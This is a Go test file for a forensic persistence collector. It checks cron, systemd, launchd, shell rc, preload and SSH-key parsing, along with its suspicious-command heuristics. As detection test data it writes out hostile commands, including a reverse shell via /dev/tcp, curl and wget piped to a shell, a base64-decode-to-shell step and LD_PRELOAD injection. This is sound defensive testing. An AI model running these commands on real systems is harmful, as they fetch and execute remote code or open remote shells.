package persistence

import (
	"context"
	"encoding/json"
	"errors"
	"os"
	"path/filepath"
	"slices"
	"strings"
	"testing"

	"github.com/archit2501/evidencelocker/internal/testutil"
	"github.com/archit2501/evidencelocker/pkg/collector"
)

func run(t *testing.T, dir string) []Entry {
	t.Helper()
	out, err := New().Collect(context.Background(), testutil.Env(t, dir))
	if err != nil {
		t.Fatal(err)
	}
	if out.Partial {
		t.Fatalf("unexpected partial: %v", out.Warnings)
	}
	var es []Entry
	for _, r := range out.Records {
		es = append(es, r.(Entry))
	}
	return es
}

func countBy(es []Entry) map[string]int {
	m := map[string]int{}
	for _, e := range es {
		m[e.Mechanism]++
	}
	return m
}

func find(es []Entry, loc string) *Entry {
	for i := range es {
		if es[i].Location == loc {
			return &es[i]
		}
	}
	return nil
}

func TestBaselineFixture(t *testing.T) {
	es := run(t, testutil.Fixture("baseline"))
	got := countBy(es)
	want := map[string]int{MechCron: 3, MechCronScript: 1, MechSystemd: 3, MechShellRC: 6, MechSSHKey: 1}
	for k, v := range want {
		if got[k] != v {
			t.Errorf("%s: %d entries, want %d (all: %v)", k, got[k], v, got)
		}
	}
	n := find(es, "/usr/lib/systemd/system/nginx.service")
	if n == nil || !strings.Contains(n.Trigger, "enabled") || n.User != "root" ||
		!strings.HasPrefix(n.Command, "/usr/sbin/nginx -t -q ; /usr/sbin/nginx -g") {
		t.Fatalf("nginx unit: %+v", n)
	}
	// /lib -> usr/lib must not produce duplicate unit entries.
	for _, e := range es {
		if strings.HasPrefix(e.Location, "/lib/") {
			t.Fatalf("unit reported through symlinked dir: %s", e.Location)
		}
	}
}

func TestCompromisedFixture(t *testing.T) {
	es := run(t, testutil.Fixture("compromised"))
	c := find(es, "/etc/cron.d/sysupdate")
	if c == nil || c.User != "root" || c.Trigger != "*/5 * * * *" || !slices.Contains(c.Notes, "download-piped-to-shell") || c.Line != 2 {
		t.Fatalf("sysupdate cron: %+v", c)
	}
	w := find(es, "/var/spool/cron/crontabs/www-data")
	if w == nil || w.User != "www-data" || w.Trigger != "@reboot" || !slices.Contains(w.Notes, "writable-dir-exec") {
		t.Fatalf("user crontab: %+v", w)
	}
	pre := find(es, "/etc/ld.so.preload")
	if pre == nil || pre.Command != "/usr/local/lib/libsysaudit.so" || pre.Notes[0] != "global-preload" {
		t.Fatalf("preload: %+v", pre)
	}
	var keys []Entry
	for _, e := range es {
		if e.Mechanism == MechSSHKey {
			keys = append(keys, e)
		}
	}
	if len(keys) != 2 || !slices.Contains(keys[1].Notes, "forced-command") || keys[1].Command != "command=/tmp/.cache/kworkerd" {
		t.Fatalf("ssh keys: %+v", keys)
	}
	rc := find(es, "/root/.bashrc")
	if rc == nil || len(rc.Notes) != 1 || !strings.Contains(rc.Notes[0], "prompt-hook") {
		t.Fatalf("bashrc notes: %+v", rc)
	}
	u := find(es, "/etc/systemd/system/dbus-org.freedesktop.helper.service")
	if u == nil || u.Trigger != "multi-user.target enabled" {
		t.Fatalf("malicious unit: %+v", u)
	}
}

func TestMacOSFixture(t *testing.T) {
	es := run(t, testutil.Fixture("macos"))
	if got := countBy(es); got[MechLaunchd] != 3 || got[MechShellRC] != 1 {
		t.Fatalf("mechanisms %v", got)
	}
	agent := find(es, "/Users/bob/Library/LaunchAgents/com.apple.softwareupdate.agent.plist")
	if agent == nil || agent.User != "bob" || agent.Name != "com.apple.softwareupdate.agent" ||
		agent.Trigger != "KeepAlive RunAtLoad StartInterval=300" ||
		agent.Command != "/bin/sh -c curl -s http://203.0.113.50/a | sh" ||
		!slices.Contains(agent.Notes, "download-piped-to-shell") {
		t.Fatalf("agent: %+v", agent)
	}
	daemon := find(es, "/Library/LaunchDaemons/com.example.backupd.plist")
	if daemon == nil || daemon.User != "root" || daemon.Trigger != "StartCalendarInterval" {
		t.Fatalf("daemon: %+v", daemon)
	}
	bin := find(es, "/Library/LaunchAgents/com.example.binary.plist")
	if bin == nil || !strings.Contains(strings.Join(bin.Notes, ";"), "binary property list") {
		t.Fatalf("binary plist: %+v", bin)
	}
}

func TestParseCronLine(t *testing.T) {
	cases := []struct {
		line   string
		system bool
		ok     bool
		want   CronLine
	}{
		{"*/5 * * * * root curl x | sh", true, true, CronLine{"*/5 * * * *", "root", "curl x | sh"}},
		{"@reboot /tmp/x  --a   b", false, true, CronLine{"@reboot", "", "/tmp/x  --a   b"}},
		{"@daily root run", true, true, CronLine{"@daily", "root", "run"}},
		{"  # comment", false, false, CronLine{}},
		{"SHELL=/bin/sh", true, false, CronLine{}},
		{"MAILTO = root", true, false, CronLine{}},
		{"* * * *", false, false, CronLine{}},
		{"* * * * * root", true, false, CronLine{}},
		{"", false, false, CronLine{}},
	}
	for _, c := range cases {
		got, ok := ParseCronLine(c.line, c.system)
		if ok != c.ok || got != c.want {
			t.Errorf("ParseCronLine(%q,%v) = %+v,%v want %+v,%v", c.line, c.system, got, ok, c.want, c.ok)
		}
	}
}

func TestParseUnit(t *testing.T) {
	u := ParseUnit("[Unit]\nDescription=x\n# c\n; c\n[Service]\nExecStart=/a \\\n  --long\nExecStartPost=\nUser=svc\nnoequals\n[Install]\nWantedBy=a.target b.target\nRequiredBy=c.target\n[Timer]\nOnCalendar=daily\n")
	if u.Description != "x" || strings.Join(u.Exec, "|") != "/a --long" || u.User != "svc" ||
		strings.Join(u.WantedBy, ",") != "a.target,b.target,c.target" || strings.Join(u.Timers, ",") != "OnCalendar=daily" {
		t.Fatalf("%+v", u)
	}
}

func TestParseAuthorizedKey(t *testing.T) {
	blob := "AAAAC3NzaC1lZDI1NTE5AAAAIOMqqnkVzrm0SdG6UOoqKLsabgH5C9okWi0dh2l9GKJl"
	k, err := ParseAuthorizedKey(`from="10.0.0.0/8",command="echo \"hi there\"",no-pty ssh-ed25519 ` + blob + ` me@host extra`)
	if err != nil || k.Type != "ssh-ed25519" || k.Command != `echo "hi there"` || k.Comment != "me@host extra" ||
		!strings.HasPrefix(k.Fingerprint, "SHA256:") || strings.HasSuffix(k.Fingerprint, "=") {
		t.Fatalf("%+v %v", k, err)
	}
	if k2, _ := ParseAuthorizedKey("nocommand=\"x\",command=\"real\" ssh-ed25519 " + blob); k2.Command != "real" {
		t.Fatalf("option boundary: %q", k2.Command)
	}
	for _, bad := range []string{"ssh-ed25519", "ssh-ed25519 !!!notbase64", "opts unknown-type AAAA", "garbage"} {
		if _, err := ParseAuthorizedKey(bad); err == nil {
			t.Errorf("accepted %q", bad)
		}
	}
	if _, err := ParseAuthorizedKey("# c"); !errors.Is(err, errSkipLine) {
		t.Fatal("comment")
	}
}

func TestHeuristics(t *testing.T) {
	cases := map[string]string{
		"curl -s http://x/a | sh":            "download-piped-to-shell",
		"wget -qO- x | sudo bash":            "download-piped-to-shell",
		"bash -i >& /dev/tcp/1.2.3.4/9 0>&1": "dev-tcp-redirect",
		"echo aGk= | base64 -d | sh":         "base64-decode",
		"/tmp/x":                             "writable-dir-exec",
		"/opt/.hidden/run":                   "hidden-path",
		"python3 -c 'import os'":             "inline-interpreter",
		"LD_PRELOAD=/x.so ls":                "preload-injection",
		"PROMPT_COMMAND=x":                   "prompt-hook",
		"alias sudo='sudo evil'":             "sudo-alias",
		"eval \"$X\"":                        "eval",
	}
	for cmd, tag := range cases {
		if !slices.Contains(Assess(cmd), tag) {
			t.Errorf("Assess(%q) = %v, missing %s", cmd, Assess(cmd), tag)
		}
	}
	if len(Assess("/usr/sbin/nginx -g 'daemon on;'")) != 0 {
		t.Fatal("benign command flagged")
	}
	notes := scriptNotes("# curl x | sh\n\n" + strings.Repeat("a", 200) + " /tmp/z\n")
	if len(notes) != 1 || !strings.HasPrefix(notes[0], "line 3: writable-dir-exec") || !strings.HasSuffix(notes[0], "...") {
		t.Fatalf("notes %v", notes)
	}
}

func TestPlistParser(t *testing.T) {
	v, err := ParsePlist([]byte(`<?xml version="1.0"?><plist><dict>
		<key>a</key><array><integer>0x10</integer><real>1.5</real><false/><data>aGk=</data><date>2026-01-01T00:00:00Z</date></array>
		<key>b</key><dict/></dict></plist>`))
	if err != nil {
		t.Fatal(err)
	}
	a := v.(map[string]any)["a"].([]any)
	if a[0].(int64) != 16 || a[1].(float64) != 1.5 || a[2].(bool) || string(a[3].([]byte)) != "hi" || a[4].(string) == "" {
		t.Fatalf("%#v", a)
	}
	bad := []string{
		``, `<notplist/>`, `<plist></plist>`, `<plist><dict><string>x</string></dict></plist>`,
		`<plist><dict><key>k</key></dict></plist>`, `<plist><integer>x</integer></plist>`,
		`<plist><real>x</real></plist>`, `<plist><data>!!</data></plist>`, `<plist><bogus/></plist>`,
		`<plist><string><b/></string></plist>`, `<plist><dict>`, strings.Repeat("<plist>", 1) + strings.Repeat("<array>", 70),
	}
	for _, b := range bad {
		if _, err := ParsePlist([]byte(b)); err == nil {
			t.Errorf("ParsePlist(%q) accepted", b)
		}
	}
	if _, err := ParsePlist([]byte("bplist00xx")); !errors.Is(err, ErrBinaryPlist) {
		t.Fatal("binary plist")
	}
	if _, err := ParseLaunchJob([]any{}); err == nil {
		t.Fatal("non-dict job")
	}
	j, err := ParseLaunchJob(map[string]any{"Label": "x", "Program": "/p", "ProgramArguments": []any{"/p", "-a"}, "KeepAlive": map[string]any{}, "UserName": "u"})
	if err != nil || strings.Join(j.Program, " ") != "/p -a" || j.Triggers[0] != "KeepAlive(conditional)" || j.UserName != "u" {
		t.Fatalf("%+v %v", j, err)
	}
	if _, err := ParseLaunchJob(map[string]any{}); err == nil {
		t.Fatal("label required")
	}
}

func FuzzParsePlist(f *testing.F) {
	f.Add([]byte(`<plist><dict><key>Label</key><string>x</string></dict></plist>`))
	f.Add([]byte(`<plist><array><array/></array></plist>`))
	f.Fuzz(func(t *testing.T, b []byte) {
		if v, err := ParsePlist(b); err == nil {
			_, _ = ParseLaunchJob(v)
		}
	})
}

func FuzzParseCronLine(f *testing.F) {
	f.Add("*/5 * * * * root curl x | sh", true)
	f.Add("@reboot x", false)
	f.Fuzz(func(t *testing.T, line string, system bool) {
		cl, ok := ParseCronLine(line, system)
		if ok && (cl.Command == "" || cl.Schedule == "") {
			t.Fatalf("accepted line without schedule/command: %q", line)
		}
	})
}

func TestLimitsAndOptions(t *testing.T) {
	dir := t.TempDir()
	os.MkdirAll(filepath.Join(dir, "etc"), 0o755)
	os.WriteFile(filepath.Join(dir, "etc", "crontab"), []byte(strings.Repeat("* * * * * root /bin/true\n", 100)), 0o644)
	os.WriteFile(filepath.Join(dir, "etc", "rc.local"), []byte("#!/bin/sh\n/tmp/x &\n"), 0o755)
	os.MkdirAll(filepath.Join(dir, "srv"), 0o755)
	os.WriteFile(filepath.Join(dir, "srv", "custom.rc"), []byte("echo hi\n"), 0o644)
	c := New()
	if err := c.Configure(json.RawMessage(`{"max_file_size":100,"extra_shell_rc":["/srv/*.rc"]}`)); err != nil {
		t.Fatal(err)
	}
	out, err := c.Collect(context.Background(), testutil.Env(t, dir))
	if err != nil || !out.Partial {
		t.Fatalf("truncation must mark partial: %v %v", out.Warnings, err)
	}
	var mechs []string
	for _, r := range out.Records {
		mechs = append(mechs, r.(Entry).Mechanism)
	}
	if !slices.Contains(mechs, MechRCLocal) || !slices.Contains(mechs, MechShellRC) {
		t.Fatalf("mechanisms %v", mechs)
	}
	for _, bad := range []string{`{"max_file_size":0}`, `{"nope":1}`} {
		if err := New().Configure(json.RawMessage(bad)); err == nil {
			t.Errorf("Configure(%s) accepted", bad)
		}
	}
	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	if _, err := New().Collect(ctx, testutil.Env(t, dir)); err == nil {
		t.Fatal("cancellation ignored")
	}
	cc := New()
	if cc.Name() != "persistence" || cc.Version() == "" || cc.Description() == "" {
		t.Fatal("metadata")
	}
}

func TestEntryIdentity(t *testing.T) {
	line := Entry{Mechanism: MechCron, Location: "/etc/crontab", Line: 3, Name: "* * * * * root x", Command: "x", FileSHA256: "a"}
	moved := line
	moved.Line, moved.FileSHA256 = 9, "b"
	if line.Key() != moved.Key() || line.Digest() != moved.Digest() {
		t.Fatal("a cron line must keep identity when other lines change")
	}
	file := Entry{Mechanism: MechShellRC, Location: "/root/.bashrc", FileSHA256: "a"}
	edited := file
	edited.FileSHA256 = "b"
	if file.Key() != edited.Key() || file.Digest() == edited.Digest() {
		t.Fatal("file-level entry must change digest with content")
	}
	var _ collector.Record = file
}
